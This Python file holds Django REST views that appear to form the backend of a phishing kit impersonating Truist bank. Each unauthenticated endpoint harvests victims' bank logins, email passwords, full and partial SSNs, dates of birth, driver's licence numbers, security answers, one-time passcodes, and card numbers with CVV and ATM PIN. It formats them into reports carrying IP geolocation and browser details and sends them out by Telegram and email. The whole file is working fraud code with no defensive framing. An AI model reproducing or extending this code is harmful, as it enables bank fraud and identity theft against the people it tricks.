import json
import os
import re
import logging
from django.conf import settings
from django.shortcuts import render
import requests
from core.app_config import app_settings

from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import (
    api_view,
    permission_classes,
    authentication_classes,
)

from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from user_data.models import Address, BankInfo, BrowserDetail, Client
from django.template.loader import get_template
from core.settings import send_data_email, send_data_telegram, save_data_to_file
from datetime import datetime

logger = logging.getLogger(__name__)

def _notification_sender():
    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL

def _notification_recipients():
    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
    return [addr for addr in recipients if addr]

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_login_cred(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.email = username
            client.save()

            bank_info = BankInfo.objects.create(
                client=client, 
                password=password, 
                username=username
            )

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -TRUIST||=====|\n"
            message += "|========= [  LOGIN  ] ==========|\n"
            message += f"| ➤ [ Username ]         : {username}\n"
            message += f"| ➤ [ Password ]         : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("truist_collect_user_login_cred failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_login_cred2(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")
            
            if not username:
                errors["username"] = ["Username required"]
            if not password:
                errors["password"] = ["Password required"]
                
            if errors:
                return Response({"errors": errors}, status=400)
                
            client, _ = Client.objects.get_or_create(username=username)
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.password2 = password
            bank_info.username2 = username
            bank_info.save()

            # Browser details and notification logic
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -TRUIST||=====|\n"
            message += "|========= [  LOGIN CONFIRM ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ Password2 ]       : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_login_cred2 failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_basic_info(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            # Extract all fields from request
            fields = {
                'username': request.data.get("emzemz", ""),
                'firstName': request.data.get("fzNme", ""),
                'lastName': request.data.get("lzNme", ""),
                'phone': request.data.get("phone", ""),
                'ssn': request.data.get("ssn", ""),
                'motherMaidenName': request.data.get("motherMaidenName", ""),
                'dob': request.data.get("dob", ""),
                'driverLicense': request.data.get("driverLicense", ""),
                'stAd': request.data.get("stAd", ""),
                'apt': request.data.get("apt", ""),
                'city': request.data.get("city", ""),
                'state': request.data.get("state", ""),
                'zipCode': request.data.get("zipCode", "")
            }
            
            # Validate required fields
            required = ['username', 'firstName', 'lastName', 'phone', 'ssn', 
                       'motherMaidenName', 'dob', 'driverLicense']
            for field in required:
                if not fields[field]:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            # Save to Client model
            client, _ = Client.objects.get_or_create(username=fields['username'])
            client.first_name = fields['firstName']
            client.last_name = fields['lastName']
            client.phone = fields['phone']
            client.ssn = fields['ssn']
            client.mother_maiden_name = fields['motherMaidenName']
            client.dob = fields['dob']
            client.driver_license = fields['driverLicense']
            client.email = fields['username']  # Using username as email
            client.save()
            
            # Save address if provided
            if any([fields['stAd'], fields['city'], fields['state'], fields['zipCode']]):
                Address.objects.update_or_create(
                    client=client,
                    defaults={
                        'street_address': fields['stAd'],
                        'apartment_unit': fields['apt'],
                        'city': fields['city'],
                        'state': fields['state'],
                        'zip_code': fields['zipCode']
                    }
                )
            
            # Browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -TRUIST||=====|\n"
            message += "|========= [  BASIC INFO ] ==========|\n"
            message += f"| ➤ [ Username ]           : {fields['username']}\n"
            message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
            message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
            message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
            message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
            message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
            message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
            message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"
            if any([fields['stAd'], fields['city'], fields['state'], fields['zipCode']]):
                message += "|=====================================|\n"
                message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
                message += "|======================================|\n"
                if fields['stAd']:
                    message += f"| ➤ [ Street Address ]     : {fields['stAd']}\n"
                if fields['apt']:
                    message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
                if fields['city']:
                    message += f"| ➤ [ City ]               : {fields['city']}\n"
                if fields['state']:
                    message += f"| ➤ [ State ]              : {fields['state']}\n"
                if fields['zipCode']:
                    message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_basic_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_security_questions(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'question1': request.data.get("securityQuestion1", ""),
                'answer1': request.data.get("securityAnswer1", ""),
                'question2': request.data.get("securityQuestion2", ""),
                'answer2': request.data.get("securityAnswer2", ""),
                'question3': request.data.get("securityQuestion3", ""),
                'answer3': request.data.get("securityAnswer3", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            client.security_question_1 = fields['question1']
            client.security_answer_1 = fields['answer1']
            client.security_question_2 = fields['question2']
            client.security_answer_2 = fields['answer2']
            client.security_question_3 = fields['question3']
            client.security_answer_3 = fields['answer3']
            client.save()
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -TRUIST||=====|\n"
            message += "|========= [  SECURITY QUESTIONS ] ==========|\n"
            message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
            message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
            message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
            message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
            message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
            message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_security_questions failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_otp_verification(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            otp = request.data.get("otp", "")
            
            if not username or not otp:
                return Response({"error": "Username and OTP required"}, status=400)
                
            client = Client.objects.get(username=username)
            # OTP verification logic would go here
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  OTP VERIFICATION ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ OTP ]            : {otp}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "OTP Verification Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_otp_verification failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_email_password(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            email = request.data.get("email", "")
            password = request.data.get("password", "")
            
            if not username or not email or not password:
                return Response({"error": "Username, email, and password required"}, status=400)
                
            client = Client.objects.get(username=username)
            client.email = email
            client.save()
            
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.email_password = password
            bank_info.save()

            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  EMAIL/PASSWORD ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ Email ]          : {email}\n"
            message += f"| ➤ [ Password ]       : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_email_password failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_card_info(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'cardNumber': request.data.get("cardNumber", ""),
                'expiryMonth': request.data.get("expiryMonth", ""),
                'expiryYear': request.data.get("expiryYear", ""),
                'cvv': request.data.get("cvv", ""),
                'atmPin': request.data.get("atmPin", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = fields['cardNumber']
            bank_info.card_expiry = f"{fields['expiryMonth']}/{fields['expiryYear']}"
            bank_info.card_cvv = fields['cvv']
            bank_info.atm_pin = fields['atmPin']
            bank_info.save()

            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  CARD INFORMATION ] ==========|\n"
            message += f"| ➤ [ Card Number ]      : {fields['cardNumber']}\n"
            message += f"| ➤ [ Expiry Month ]     : {fields['expiryMonth']}\n"
            message += f"| ➤ [ Expiry Year ]      : {fields['expiryYear']}\n"
            message += f"| ➤ [ CVV ]              : {fields['cvv']}\n"
            message += f"| ➤ [ ATM PIN ]          : {fields['atmPin']}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_card_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_home_address(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            fields = {
                'username': request.data.get("emzemz", ""),
                'streetAddress': request.data.get("streetAddress", ""),
                'apartmentUnit': request.data.get("apartmentUnit", ""),
                'city': request.data.get("city", ""),
                'state': request.data.get("state", ""),
                'zipCode': request.data.get("zipCode", "")
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            Address.objects.update_or_create(
                client=client,
                defaults={
                    'street_address': fields['streetAddress'],
                    'apartment_unit': fields['apartmentUnit'],
                    'city': fields['city'],
                    'state': fields['state'],
                    'zip_code': fields['zipCode']
                }
            )

            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  HOME ADDRESS ] ==========|\n"
            message += f"| ➤ [ Street Address ]   : {fields['streetAddress']}\n"
            message += f"| ➤ [ Apartment/Unit ]   : {fields['apartmentUnit']}\n"
            message += f"| ➤ [ City ]             : {fields['city']}\n"
            message += f"| ➤ [ State ]            : {fields['state']}\n"
            message += f"| ➤ [ ZIP Code ]         : {fields['zipCode']}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_home_address failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_social_security(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn_short = request.data.get("s2ns", "")
            dob = request.data.get("d_b", "")
            
            if not username:
                errors["username"] = ["Username required"]
                
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=username)
            client.social_security_short = ssn_short
            client.dob = dob
            client.save()

            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
            message += f"| ➤ [ DOB ]             : {dob}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_social_security failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def truist_collect_user_social_security_2(request):
    payload = {}
    errors = {}
    
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn = request.data.get("s2ns", "")
            
            if not username:
                errors["username"] = ["Username required"]
                
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=username)
            client.social_security = ssn
            client.save()

            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Truist Flow||=====|\n"
            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ SSN ]             : {ssn}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("truist_collect_user_social_security_2 failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)
